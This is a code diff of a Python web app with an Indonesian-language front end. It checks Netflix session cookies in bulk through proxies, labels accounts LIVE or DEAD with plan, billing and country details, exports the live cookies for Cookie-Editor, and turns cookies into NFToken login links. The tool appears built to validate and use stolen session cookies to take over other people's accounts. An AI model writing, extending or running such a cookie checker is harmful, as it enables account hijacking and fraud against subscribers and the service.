+  <div id="panel-history" class="section-panel">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+      <span style="font-size:13px; color:var(--text-muted);">Riwayat tersimpan di SQLite lokal (netflix_suite.db)</span>
+      <div style="display:flex; gap:8px;">
+        <button class="btn-secondary" onclick="loadHistory()">Refresh</button>
+        <button class="btn-secondary" style="color:var(--red)" onclick="clearDbHistory()">Hapus Semua</button>
+      </div>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Waktu</th><th>Tipe</th><th>Status</th><th>Plan</th><th>Billing</th><th>Country</th><th>Aksi</th></tr>
+        </thead>
+        <tbody id="history-tbody"></tbody>
+      </table>
+    </div>
+  </div>
 </div>
 
 <script>
-let currentMode = 'nftoken';
+let bulkRunning = false;
+let bulkResults = [];
 
-function switchTab(mode) {
-  currentMode = mode;
-  document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-  event.target.classList.add('active');
-
-  const btn = document.getElementById('btn-action');
-  const out = document.getElementById('output-box');
-  out.style.display = 'none';
-
-  if (mode === 'nftoken') {
-    btn.innerHTML = '<span>Generate Login NFToken</span>';
-    document.getElementById('input-label').innerText = 'Cookie Netflix (NetflixId)';
-  } else {
-    btn.innerHTML = '<span>Check Status Akun</span>';
-    document.getElementById('input-label').innerText = 'Cookie Netflix (NetflixId / SecureNetflixId)';
-  }
+function switchTab(tab) {
+  document.querySelectorAll('.tab-btn').forEach((b, i) => {
+    b.classList.toggle('active', (i === 0 && tab === 'single') || (i === 1 && tab === 'bulk') || (i === 2 && tab === 'history'));
+  });
+  document.getElementById('panel-single').classList.toggle('active', tab === 'single');
+  document.getElementById('panel-bulk').classList.toggle('active', tab === 'bulk');
+  document.getElementById('panel-history').classList.toggle('active', tab === 'history');
+  if (tab === 'history') loadHistory();
 }
 
-async function executeAction() {
-  const cookie = document.getElementById('cookie-input').value.trim();
-  const useProxy = document.getElementById('chk-proxy').checked;
-  const btn = document.getElementById('btn-action');
-  const out = document.getElementById('output-box');
+function toggleSingleMode() {
+  const m = document.querySelector('input[name="single-mode"]:checked').value;
+  document.getElementById('single-btn-text').innerText = m === 'nftoken' ? 'Generate NFToken' : 'Check Status Akun';
+}
 
-  if (!cookie) {
-    alert('Silakan masukkan cookie terlebih dahulu!');
-    return;
-  }
+async function fetchStats() {
+  try {
+    const res = await fetch('/api/proxies');
+    const d = await res.json();
+    document.getElementById('proxy-count-label').innerText = `${d.count} Proxy Aktif`;
+  } catch(e) {}
+}
+
+async function runSingle() {
+  const mode = document.querySelector('input[name="single-mode"]:checked').value;
+  const cookie = document.getElementById('single-cookie').value.trim();
+  const use_proxy = document.getElementById('proxy-toggle').checked;
+  const out = document.getElementById('single-out');
+  const btn = document.getElementById('single-btn');
+
+  if (!cookie) { alert('Masukkan cookie terlebih dahulu'); return; }
 
   btn.disabled = true;
   out.style.display = 'none';
 
-  if (currentMode === 'nftoken') {
-    btn.innerHTML = '<span>Mengambil NFToken via Netflix API...</span>';
-    try {
-      const res = await fetch('/api/token', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({cookie, use_proxy: useProxy})
-      });
-      const data = await res.json();
-      if (!res.ok || data.error) throw new Error(data.error || 'Gagal generate token');
+  try {
+    const endpoint = mode === 'nftoken' ? '/api/token' : '/api/check';
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({cookie, use_proxy})
+    });
+    const d = await res.json();
 
-      out.className = 'result-box success';
+    if (mode === 'nftoken') {
+      if (d.error) throw new Error(d.error);
+      out.className = 'card-out live';
       out.innerHTML = `
-        <div class="res-header">
-          <span>NFToken Login Link Dibuat</span>
-          <span class="pill pill-live">READY</span>
+        <strong>Login NFToken Berhasil:</strong>
+        <div class="token-link"><a href="${d.url}" target="_blank">${d.url}</a></div>
+        <div class="grid-meta">
+          <div class="meta-box"><span>Expired</span><strong>${d.expires}</strong></div>
+          <div class="meta-box"><span>Route</span><strong>${d.route}</strong></div>
         </div>
-        <div class="link-field">
-          <a href="${data.url}" target="_blank" class="link-input" id="url-target">${data.url}</a>
-          <button class="btn-mini" onclick="copyText('${data.url}')">Salin</button>
-        </div>
-        <div class="grid-info">
-          <div class="info-card">
-            <div class="info-title">Expired Time</div>
-            <div class="info-val">${data.expires}</div>
-          </div>
-          <div class="info-card">
-            <div class="info-title">Route Connection</div>
-            <div class="info-val" style="font-size:12px;">${data.route}</div>
-          </div>
-        </div>
+        <div class="action-row"><button class="btn-secondary" onclick="copyText('${d.url}')">Salin URL</button></div>
       `;
-      out.style.display = 'block';
-    } catch (err) {
-      out.className = 'result-box error';
-      out.innerHTML = `<div class="res-header"><span>Gagal</span><span class="pill pill-dead">ERROR</span></div><div>${err.message}</div>`;
-      out.style.display = 'block';
-    } finally {
-      btn.disabled = false;
-      btn.innerHTML = '<span>Generate Login NFToken</span>';
+    } else {
+      if (!d.live) throw new Error(d.reason || 'Akun Dead');
+      out.className = 'card-out live';
+      out.innerHTML = `
+        <strong>Akun Live Valid:</strong>
+        <div class="grid-meta">
+          <div class="meta-box"><span>Plan</span><strong>${d.plan}</strong></div>
+          <div class="meta-box"><span>Next Billing</span><strong>${d.billing}</strong></div>
+          <div class="meta-box"><span>Country</span><strong>${d.country}</strong></div>
+          <div class="meta-box"><span>Route</span><strong>${d.route}</strong></div>
+        </div>
+        <div class="action-row"><button class="btn-secondary" onclick="copyJson(${JSON.stringify(d.cookies).replace(/"/g, '&quot;')})">Salin Cookie JSON</button></div>
+      `;
     }
-  } else {
-    btn.innerHTML = '<span>Memeriksa Membership ke Netflix...</span>';
+    out.style.display = 'block';
+  } catch(e) {
+    out.className = 'card-out dead';
+    out.innerHTML = `<strong>Gagal:</strong> <div>${e.message}</div>`;
+    out.style.display = 'block';
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+async function runBulk() {
+  const text = document.getElementById('bulk-input').value.trim();
+  if (!text) { alert('Isi baris cookie terlebih dahulu'); return; }
+  const lines = text.split('\\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+  if (lines.length === 0) return;
+
+  const use_proxy = document.getElementById('proxy-toggle').checked;
+  bulkRunning = true;
+  bulkResults = [];
+  document.getElementById('bulk-btn').disabled = true;
+  document.getElementById('bulk-progress').style.display = 'block';
+  document.getElementById('bulk-tbody').innerHTML = '';
+
+  let live = 0, fourk = 0, dead = 0;
+  document.getElementById('stat-total').innerText = lines.length;
+
+  for (let i = 0; i < lines.length; i++) {
+    if (!bulkRunning) break;
+    const line = lines[i];
+    const pct = Math.round(((i + 1) / lines.length) * 100);
+    document.getElementById('progress-status').innerText = `Memeriksa ${i + 1}/${lines.length}...`;
+    document.getElementById('progress-percent').innerText = `${pct}%`;
+    document.getElementById('progress-fill').style.width = `${pct}%`;
+
     try {
       const res = await fetch('/api/check', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({cookie, use_proxy: useProxy})
+        body: JSON.stringify({cookie: line, use_proxy})
       });
-      const data = await res.json();
-      if (!res.ok || data.error) throw new Error(data.error || 'Gagal check akun');
+      const d = await res.json();
+      const item = { index: i + 1, raw: line, ...d };
+      bulkResults.push(item);
 
-      if (data.live) {
-        window.lastCookies = JSON.stringify(data.cookies, null, 2);
-        out.className = 'result-box success';
-        out.innerHTML = `
-          <div class="res-header">
-            <span>Akun Netflix LIVE / AKTIF</span>
-            <span class="pill pill-live">LIVE</span>
-          </div>
-          <div class="grid-info">
-            <div class="info-card">
-              <div class="info-title">Plan / Paket</div>
-              <div class="info-val">${data.plan}</div>
-            </div>
-            <div class="info-card">
-              <div class="info-title">Next Billing Date</div>
-              <div class="info-val">${data.billing}</div>
-            </div>
-            <div class="info-card">
-              <div class="info-title">Negara Akun</div>
-              <div class="info-val">${data.country}</div>
-            </div>
-            <div class="info-card">
-              <div class="info-title">Route</div>
-              <div class="info-val" style="font-size:12px;">${data.route}</div>
-            </div>
-          </div>
-          <div style="margin-top:12px; display:flex; gap:8px;">
-            <button class="btn-mini" onclick="copyCookies()">📋 Salin JSON Cookie (Cookie-Editor)</button>
-          </div>
-        `;
+      if (d.live) {
+        live++;
+        if (d.plan.includes('4K')) fourk++;
       } else {
-        out.className = 'result-box error';
-        out.innerHTML = `
-          <div class="res-header">
-            <span>Akun Netflix DEAD</span>
-            <span class="pill pill-dead">DEAD</span>
-          </div>
-          <div><b>Alasan:</b> ${data.reason || 'Sesi cookie ditolak / expired.'}</div>
-          <div style="margin-top:6px; font-size:11px; color:#aaa;">Route: ${data.route || 'Direct'}</div>
-        `;
+        dead++;
       }
-      out.style.display = 'block';
-    } catch (err) {
-      out.className = 'result-box error';
-      out.innerHTML = `<div class="res-header"><span>Gagal Memproses</span><span class="pill pill-dead">ERROR</span></div><div>${err.message}</div>`;
-      out.style.display = 'block';
-    } finally {
-      btn.disabled = false;
-      btn.innerHTML = '<span>Check Status Akun</span>';
+      appendBulkRow(item);
+    } catch(e) {
+      dead++;
+      appendBulkRow({ index: i + 1, live: false, plan: 'Error', billing: '-', country: '-', route: '-' });
     }
+
+    document.getElementById('stat-live').innerText = live;
+    document.getElementById('stat-4k').innerText = fourk;
+    document.getElementById('stat-dead').innerText = dead;
+  }
+  bulkRunning = false;
+  document.getElementById('bulk-btn').disabled = false;
+}
+
+function stopBulk() { bulkRunning = false; }
+
+function appendBulkRow(item) {
+  const tbody = document.getElementById('bulk-tbody');
+  const tr = document.createElement('tr');
+  tr.innerHTML = `
+    <td>${item.index}</td>
+    <td class="${item.live ? 'tag-live' : 'tag-dead'}">${item.live ? 'LIVE' : 'DEAD'}</td>
+    <td>${item.plan || '-'}</td>
+    <td>${item.billing || '-'}</td>
+    <td>${item.country || '-'}</td>
+    <td style="color:var(--text-muted)">${item.route || 'Direct'}</td>
+  `;
+  tbody.prepend(tr);
+}
+
+function exportBulk(type) {
+  const lives = bulkResults.filter(r => r.live);
+  if (lives.length === 0) { alert('Belum ada akun LIVE'); return; }
+
+  let blob, filename;
+  if (type === 'txt') {
+    const lines = lives.map((r, i) => `[${i+1}] Plan: ${r.plan} | Billing: ${r.billing} | Country: ${r.country}\\nCookie: ${r.raw}\\n----------------------------------`);
+    blob = new Blob([lines.join('\\n')], {type: 'text/plain'});
+    filename = `netflix_live_${Date.now()}.txt`;
+  } else {
+    blob = new Blob([JSON.stringify(lives, null, 2)], {type: 'application/json'});
+    filename = `netflix_live_${Date.now()}.json`;
+  }
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = filename;
+  a.click();
+}
+
+async function loadHistory() {
+  const tbody = document.getElementById('history-tbody');
+  tbody.innerHTML = '<tr><td colspan="7">Memuat...</td></tr>';
+  try {
+    const res = await fetch('/api/history');
+    const rows = await res.json();
+    if (rows.length === 0) { tbody.innerHTML = '<tr><td colspan="7">Belum ada riwayat.</td></tr>'; return; }
+    tbody.innerHTML = rows.map(r => `
+      <tr>
+        <td style="color:var(--text-muted)">${r.created_at}</td>
+        <td>${r.type.toUpperCase()}</td>
+        <td class="${r.status === 'LIVE' ? 'tag-live' : 'tag-dead'}">${r.status}</td>
+        <td>${r.plan || '-'}</td>
+        <td>${r.billing || '-'}</td>
+        <td>${r.country || '-'}</td>
+        <td>${r.token_url ? `<a href="${r.token_url}" target="_blank" style="color:#60a5fa">Buka Link</a>` : '-'}</td>
+      </tr>
+    `).join('');
+  } catch(e) {
+    tbody.innerHTML = '<tr><td colspan="7">Gagal memuat riwayat.</td></tr>';
   }
 }
 
-function copyText(val) {
-  navigator.clipboard.writeText(val);
-  alert('Link berhasil disalin!');
+async function clearDbHistory() {
+  if (!confirm('Yakin ingin menghapus seluruh riwayat di SQLite?')) return;
+  await fetch('/api/history/clear', {method: 'POST'});
+  loadHistory();
 }
 
-function copyCookies() {
-  if (window.lastCookies) {
-    navigator.clipboard.writeText(window.lastCookies);
-    alert('Cookie JSON berhasil disalin untuk Cookie-Editor!');
-  }
-}
+function copyText(str) { navigator.clipboard.writeText(str); alert('Disalin ke clipboard!'); }
+function copyJson(obj) { navigator.clipboard.writeText(JSON.stringify(obj, null, 2)); alert('Cookie JSON disalin!'); }
 
-// Inisialisasi awal
-switchTab('nftoken');
+fetchStats();
 </script>
 </body>
 </html>
 """
-
-class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
-    daemon_threads = True
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
     def do_GET(self):
-        if self.path == "/" or self.path.startswith("/?"):
+        if self.path in ("/", "/index.html") or self.path.startswith("/?"):
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
-            self.wfile.write(HTML_PAGE.encode("utf-8"))
+            self.wfile.write(HTML.encode("utf-8"))
+        elif self.path == "/api/proxies":
+            p = load_proxies()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps({"count": len(p)}).encode("utf-8"))
+        elif self.path == "/api/history":
+            rows = get_history()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(json.dumps(rows).encode("utf-8"))
         else:
             self.send_response(404)
             self.end_headers()
 
     def do_POST(self):
         clen = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(clen)
+        body = self.rfile.read(clen) if clen > 0 else b"{}"
 
         if self.path == "/api/token":
             try:
-                payload = json.loads(body.decode("utf-8"))
-                use_px = payload.get("use_proxy", True)
-                url, expires, route = generate_nftoken(payload.get("cookie", ""), use_proxy=use_px)
-                res_body = json.dumps({"url": url, "expires": expires, "route": route}).encode("utf-8")
+                p = json.loads(body.decode("utf-8"))
+                url, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
+                res = json.dumps({"url": url, "expires": exp, "route": route}).encode("utf-8")
                 self.send_response(200)
             except Exception as e:
-                res_body = json.dumps({"error": str(e)}).encode("utf-8")
+                res = json.dumps({"error": str(e)}).encode("utf-8")
                 self.send_response(400)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
-            self.wfile.write(res_body)
+            self.wfile.write(res)
 
         elif self.path == "/api/check":
             try:
-                payload = json.loads(body.decode("utf-8"))
-                use_px = payload.get("use_proxy", True)
-                result = check_netflix_membership(payload.get("cookie", ""), use_proxy=use_px)
-                res_body = json.dumps(result).encode("utf-8")
+                p = json.loads(body.decode("utf-8"))
+                out = check_netflix_membership(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
+                res = json.dumps(out).encode("utf-8")
                 self.send_response(200)
             except Exception as e:
-                res_body = json.dumps({"error": str(e)}).encode("utf-8")
+                res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
                 self.send_response(400)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
-            self.wfile.write(res_body)
+            self.wfile.write(res)
+
+        elif self.path == "/api/history/clear":
+            clear_history()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.end_headers()
+            self.wfile.write(b'{"status": "cleared"}')
         else:
             self.send_response(404)
             self.end_headers()
 
+class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
+    daemon_threads = True
+
 def run():
-    ThreadingSimpleServer.allow_reuse_address = True
-    with ThreadingSimpleServer(("", PORT), Handler) as httpd:
-        print(f"Server jalan di: http://localhost:{PORT}")
-        httpd.serve_forever()
+    init_db()
+    socketserver.TCPServer.allow_reuse_address = True
+    server = ThreadingSimpleServer(("", PORT), Handler)
+    print(f"Server jalan: http://localhost:{PORT}")
+    server.serve_forever()
 
 if __name__ == "__main__":
     run()
